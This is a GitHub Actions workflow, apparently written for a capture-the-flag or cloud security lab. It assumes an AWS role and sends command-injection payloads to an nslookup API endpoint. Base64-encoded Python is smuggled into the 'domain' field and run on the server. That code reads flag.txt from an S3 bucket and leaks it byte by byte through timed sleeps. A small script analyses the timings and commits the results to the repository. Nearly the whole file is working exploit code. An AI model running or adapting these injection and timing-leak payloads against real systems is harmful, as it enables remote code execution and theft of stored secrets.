name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Run matching-byte count + strip variants
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          EXPECTED="333536796c6d6d796a68727a686d7035"

          run_timed() {
            local label=$1; local b64=$2
            local INJ="x; echo $b64 | base64 -d | python3 #"
            local t0=$(date +%s%3N)
            curl -s -X POST "$URL" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
            local t1=$(date +%s%3N)
            local dt=$((t1-t0))
            echo "$label ${dt}ms" | tee -a debug5.txt
          }

          echo "# debug5 run $(date -u)" > debug5.txt

          # Warm calibration first
          CAL_PY="import boto3,time;boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(0)"
          run_timed "cal1" "$(echo -n "$CAL_PY" | base64 -w0)"
          run_timed "cal2" "$(echo -n "$CAL_PY" | base64 -w0)"

          # Count matching bytes (sleep = number of matching bytes 0-16)
          PY_MATCH="import boto3,time;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();expected=bytes.fromhex('${EXPECTED}');matches=sum(1 for a,b in zip(flag,expected) if a==b);time.sleep(matches)"
          run_timed "match_raw" "$(echo -n "$PY_MATCH" | base64 -w0)"

          # Count matching bytes with strip()
          PY_MATCH2="import boto3,time;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();f=flag.strip();expected=bytes.fromhex('${EXPECTED}');matches=sum(1 for a,b in zip(f,expected) if a==b);time.sleep(matches)"
          run_timed "match_strip" "$(echo -n "$PY_MATCH2" | base64 -w0)"

          # Verify with strip() (sleep=10 if correct, else 2)
          PY_VERIFY="import boto3,time;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();f=flag.strip();time.sleep(10 if f==bytes.fromhex('${EXPECTED}') else 2)"
          run_timed "verify_strip" "$(echo -n "$PY_VERIFY" | base64 -w0)"

          # Also check: flag length after strip()
          PY_LENSTRIP="import boto3,time;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();f=flag.strip();time.sleep(len(f))"
          run_timed "len_strip" "$(echo -n "$PY_LENSTRIP" | base64 -w0)"

          # Calibration after
          run_timed "cal3" "$(echo -n "$CAL_PY" | base64 -w0)"
          run_timed "cal4" "$(echo -n "$CAL_PY" | base64 -w0)"

          echo "" >> debug5.txt
          # Analysis
          python3 << 'PYEOF'
          import re

          timings = {}
          for line in open('debug5.txt'):
              p = line.strip().split()
              if len(p) == 2 and p[1].endswith('ms'):
                  timings[p[0]] = int(p[1][:-2])

          print("Timings:", timings)

          cal_vals = [timings.get(k) for k in ['cal1','cal2','cal3','cal4'] if k in timings]
          overhead = sum(cal_vals) / len(cal_vals) if cal_vals else 2000
          print(f"Overhead (avg of {len(cal_vals)} cal calls): {overhead:.0f}ms")

          for key in ['match_raw','match_strip','verify_strip','len_strip']:
              if key in timings:
                  adj = timings[key] - overhead
                  val = round(adj / 1000)
                  print(f"{key}: {timings[key]}ms → adj={adj:.0f}ms → sleep≈{val}")
          PYEOF

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add debug5.txt
          git commit -m "matching-byte count + strip verify" || echo "Nothing to commit"
          git push origin corgi
